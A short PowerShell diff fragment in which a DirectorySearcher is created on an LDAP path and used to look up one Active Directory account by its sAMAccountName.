+    $searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$ldapPath)
     $searcher.Filter = "(&(sAMAccountName=$samAccountName))"
     $result = $searcher.FindOne()
 
